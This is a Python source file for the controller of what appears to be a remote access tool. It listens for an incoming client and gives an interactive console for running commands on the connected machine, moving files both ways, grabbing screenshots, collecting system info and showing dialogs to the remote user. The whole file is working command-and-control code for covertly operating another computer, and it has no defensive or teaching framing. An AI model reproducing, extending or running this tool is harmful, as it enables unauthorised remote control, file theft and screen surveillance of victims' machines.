import datetime
import json
import os.path
import random
import re
import socket
import threading

from prompt_toolkit import prompt, HTML, print_formatted_text
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import PathCompleter, NestedCompleter
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.key_binding import KeyBindings
from prompt_toolkit.shortcuts import set_title
from rich.emoji import Emoji

import randomizer
from ConnectionValidator import Validator
from Dialog import dialog_types, DialogTest
from Help import Session_help
from Tree import TreeSession
from Typo import Corrections
from encoders import all_encoders
from prompt_config import prompt_style
from rich_print import rprint
from screen import Screen
from util import Table, count_bytes, History


def interact_session(sessions, id: str):
    if not id in sessions:
        return

    def isListening():
        return sessions[id]['listening']

    def isConnected():
        return sessions[id]['connected']

    dialog_settings = {
        "type": 'error',
        "title": 'Error!',
        "message": 'Something went wrong!'
    }
    disconnect_command = "disconnect"

    class target:
        ip = "---.---.---.---"
        port = 0

    BufferSize = 1024

    def setDisconnected():
        sessions[id]['socket'] = None
        sessions[id]['connector'] = None
        sessions[id]['connected'] = False
        sessions[id]['time'] = '----/--/-- --:--:--.---'
        sessions[id]['listening'] = False
        target.ip = "---.---.---.---"
        target.port = 0

    def setCommands(commands_dict: dict, add: dict = None, remove: list = None):
        if remove:
            for item in remove:
                if item in commands_dict:
                    commands_dict.pop(item)

        if add:
            for key in add:
                commands_dict.update({key: add[key]})

    def Read_file(path):
        with open(path, 'rb') as file:
            return file.read()

    def Write_file(path, content):
        with open(path, 'wb') as file:
            file.write(content)

    def Upload_file(filename):
        if sessions[id]['connected']:
            if os.path.exists(filename):
                if os.path.isfile(filename):
                    rprint("[~] Uploading '%s' to '%s'.." % (filename, id))
                    connector = sessions[id]['connector']
                    file_obj = open(filename, 'rb')
                    connector.send(file_obj.read())
                    file_obj.close()
                    rprint("[+] Uploaded '%s' to '%s'.." % (filename, id))
                else:
                    rprint("'%s' is not a file." % (filename))
            else:
                rprint("'%s' not exists." % (filename))
        else:
            rprint("'%s' is not connected." % id)

    def Download_file(filename, timeout:int=1):
        if sessions[id]['connected']:
            connector = sessions[id]['connector']
            connector.settimeout(timeout) # to manage EOF
            try:
                chunk = connector.recv(BufferSize)
                if chunk:
                    file_obj = open(filename, 'wb')
                    while chunk:
                        file_obj.write(chunk)
                        try:
                            chunk = connector.recv(BufferSize)
                        except (socket.timeout, TimeoutError) as e:
                            print(e)
                            break  # after 1 second if no response file will be closed..
                else:
                    return
            except (socket.timeout, TimeoutError) as e:
                print(e)
                return
            connector.settimeout(None)  # and timeout will be reset to None (which means infinity)
            file_obj.close()
        else:
            rprint("'%s' is not connected." % id)

    def ScreenShot():
        name = id + "_screenshot" + str(randomizer.Randomize().id(length=5)) + ".png"
        Download_file(filename=name, timeout=3)
        rprint("File saved as '%s'." % name)

    def Send(data: str):
        if sessions[id]['connected']:
            connector = sessions[id]['connector']

            # data= [DATA] <class 'str'>
            json_data = json.dumps(data)  # "[DATA]" <class 'str'>
            connector.send(json_data.encode(encoding=sessions[id]['encoding'],
                                            errors="ignore"))  # send: b"[DATA]" as <class 'bytes'>
            sessions[id]['sent'] += len(data)

    def Receive(BufferSize: int = 1024):
        if sessions[id]['connected']:
            data = ''
            while True:
                try:
                    connector = sessions[id]['connector']
                    data += connector.recv(BufferSize).decode(encoding=sessions[id]['encoding'], errors="ignore")
                    json_data = json.loads(data)
                    return json_data
                except ValueError:
                    continue
                except ConnectionAbortedError:
                    print("Connection lost while receiving")
                    setDisconnected()
                    break
                except AttributeError:
                    break
                except TimeoutError as terr:
                    print(str(terr))
                    break

    bindings = KeyBindings()

    @bindings.add(" ")
    def _(event):
        b = event.app.current_buffer
        w = b.document.get_word_before_cursor()

        if w is not None:
            if w in Corrections:
                b.delete_before_cursor(count=len(w))
                b.insert_text(Corrections[w])

        b.insert_text(" ")

    while True:
        try:
            title = "%s%s" % (id, " | Connected" if isConnected() else " | Listening" if isListening() else "")
            set_title(title)

            def Session_Bottom_toolbar():
                return [
                    ("bg:black black", str(Emoji('skull')) + str(Emoji('smiling_face_with_horns'))),
                    ("bg:cyan black", ' %s:%s ' % (target.ip, str(target.port))),
                    ("bg:white black", '|'),
                    ("bg:green black", ' %s ' % count_bytes(sessions[id]['sent'])),
                    ("bg:white black", '|'),
                    ("bg:red black", ' %s' % count_bytes(sessions[id]['received'])),
                ]

            def Session_RPrompt():
                color = "#ff0000"
                if sessions[id]['connected']:
                    color = "#00ff00"
                time = datetime.datetime.now().strftime("%I:%M:%S")
                period = datetime.datetime.now().strftime("%p")
                return [
                    (f"bg:{color} #ffffff", f" {time} "),
                    (f"bg:cornsilk fg:{color}", f" {period} "),
                ]

            session_commands = {
                "listen": None,
                "set": {
                    "ip": None,
                    "port": None,
                    "encoding": all_encoders,
                    "dialog": {
                        "type": {}.fromkeys(dialog_types, None),
                        "title": None,
                        "message": None,
                        "response": {}.fromkeys(["true", "false"], None)
                    },
                },
                "show": {
                    "session": None,
                    "dialog": {
                        "settings": None,
                        "test": None
                    },
                    # "settings": None
                },
                "history": {
                    "show": None,
                    "clear": None
                },
                "help": None,
                "clear": None,
                "exit": None,
                # disconnect_command: None,
            }

            id_color = "red"
            if sessions[id]['connected']:
                id_color = "green"

            sorted_keys = sorted(session_commands)
            sorted_session_commands = {}
            for item in sorted_keys:
                sorted_session_commands[item] = session_commands[item]
            session_commands = sorted_session_commands

            def Relist_Commands():
                on_connected_add = {
                    "download": None,
                    "upload": PathCompleter(expanduser=True, only_directories=False),
                    "sysinfo": None,
                    disconnect_command: None,
                    "dialog": None,
                    "screenshot": None
                }
                on_connected_remove = ["listen", "unlisten"]
                on_listening_add = {"unlisten": None}
                on_listening_remove = ["listen"] + list(on_connected_add.keys())
                not_connected_or_listening = {"listen": None}

                if not isConnected() and not isListening():
                    setCommands(commands_dict=session_commands, add=not_connected_or_listening, remove=list(on_connected_add.keys()))
                elif not isConnected() and isListening(): # listening
                    setCommands(commands_dict=session_commands, add=on_listening_add, remove=on_listening_remove)
                elif isConnected() and not isListening():  # connected
                    setCommands(commands_dict=session_commands, add=on_connected_add, remove=on_connected_remove)
            Relist_Commands()

            history_object = InMemoryHistory(sessions[id]['history'])
            session_prompt = prompt(message=HTML("[<b fg='%s'>%s</b>]<a fg='#999fff'>~$</a> " % (id_color, id)),
                                    refresh_interval=0.999, enable_system_prompt=True,
                                    enable_suspend=True, enable_history_search=True, search_ignore_case=True,
                                    complete_while_typing=True,
                                    completer=NestedCompleter.from_nested_dict(session_commands),
                                    history=history_object, validate_while_typing=True, wrap_lines=False,
                                    complete_in_thread=True, include_default_pygments_style=True,
                                    key_bindings=bindings,
                                    auto_suggest=AutoSuggestFromHistory(), style=prompt_style,
                                    rprompt=Session_RPrompt,
                                    bottom_toolbar=Session_Bottom_toolbar)
            sp = re.findall("(\S+)", session_prompt)  # session prompt
            Relist_Commands()
            if len(sp) > 0:
                sessions[id]['history'].append(' '.join(sp))

            if sp[0] == "listen" and not sessions[id]['connected']:
                validator = Validator()
                if not sessions[id]['listening'] and not sessions[id]['connected']:
                    if validator.ip(ip=sessions[id]['ip']):
                        if validator.port(port=sessions[id]['port']):
                            def Listen(max_listen: int = 1):
                                try:
                                    HOST = sessions[id]['ip']
                                    PORT = sessions[id]['port']

                                    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # tcp protocol
                                    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                                    sessions[id]['connected'] = False
                                    sessions[id]['socket'] = server_socket
                                    sessions[id]['listening'] = True
                                    Relist_Commands()

                                    server_socket.bind((HOST, PORT))
                                    print('[+] Server Started')
                                    print('[+] Listening For Client Connection...')
                                    server_socket.listen(max_listen)
                                    Relist_Commands()

                                    (server_connection, (target.ip, target.port)) = server_socket.accept()  # here connecting get established
                                    sessions[id]['connector'] = server_connection
                                    sessions[id]['connected'] = True
                                    sessions[id]['time'] = str(datetime.datetime.now())
                                    sessions[id]['listening'] = False
                                    Relist_Commands()

                                    print_formatted_text(HTML("[*] '<b fg='#00ff00'>%s</b>' Connected. " % id))
                                except (ConnectionAbortedError, TimeoutError):
                                    sessions[id]['connected'] = False
                                    Relist_Commands()

                            threading.Thread(target=Listen).start()
                        else:
                            print("'%s' is not a valid port." % sessions[id]['port'])
                    else:
                        print("'%s' is not a valid ip." % sessions[id]['ip'])
                else:
                    print("Your already listening to '%s'" % id)
            elif sp[0] == "unlisten":
                if isListening() and not isConnected():
                    sessions[id]['socket'].close()
                    setDisconnected()
            elif sp[0] == "set":
                if sp[1] == "ip":
                    validator = Validator()
                    if validator.ip(ip=sp[2]):
                        sessions[id]['ip'] = sp[2]
                    else:
                        print("Parse a valid ip address * PLEASE * (:")
                elif sp[1] == "port":
                    validator = Validator()
                    if validator.port(port=sp[2]):
                        sessions[id]['port'] = int(sp[2])
                    else:
                        print("Parse a valid port number * PLEASE * (:")
                elif sp[1] == "encoding":
                    encoding = sp[2]
                    if encoding in all_encoders.keys():
                        sessions[id]['encoding'] = encoding
                        print("Encoding set to: %s" % encoding)
                elif sp[1] == "dialog":
                    if sp[2] == "type":
                        if sp[3] in dialog_types:
                            dialog_settings[sp[2]] = sp[3]
                    elif sp[2] in ["title", "message"]:
                        dialog_settings[sp[2]] = ' '.join(sp[3:])
            elif sp[0] == "show":
                if sp[1] == "dialog":
                    if sp[2] == "settings":
                        rprint(Table(headers=list(dialog_settings.keys()), data=[dialog_settings.values()]))
                    elif sp[2] == "test":
                        DialogTest(dialog_settings=dialog_settings)
                elif sp[1] == "session":
                    TreeSession(id, sessions)
            elif sp[0] == "history":
                if sp[1] == "show":
                    print(History(data=sessions[id]['history']))
                elif sp[1] == "clear":
                    sessions[id]['history'].clear()
            elif sp[0] == "help":
                #
                Session_help()
            elif sp[0] == "clear":
                #
                Screen().clear()
            elif sp[0] == "exit":
                #
                break

            elif sp[0] == disconnect_command:
                if isConnected():
                    setDisconnected()
                else:
                    print_formatted_text(HTML("<i fg='red'>You're not even connected.</i>"))
            elif sp[0] == "sysinfo":
                Send(data=session_prompt)
                rprint(Receive())
            elif sp[0] == "cd":
                #
                Send(data=session_prompt)
            elif sp[0] == "download":
                Send(data=session_prompt)
                Download_file(filename=' '.join(sp[1:]))
            elif sp[0] == "upload":
                Send(data=session_prompt)
                Upload_file(filename=' '.join(sp[1:]))
            elif sp[0] == "dialog":
                Send(data=session_prompt)
                Send(data=dialog_settings)
            elif sp[0] == "screenshot":
                Send(data=session_prompt)
                ScreenShot()
            else:
                Send(data=session_prompt)
                received = Receive()
                if received:
                    print(received)
            Relist_Commands()
        except (IndexError, KeyboardInterrupt):
            pass

    # if session['connected']:
    #     session['connector'].close()
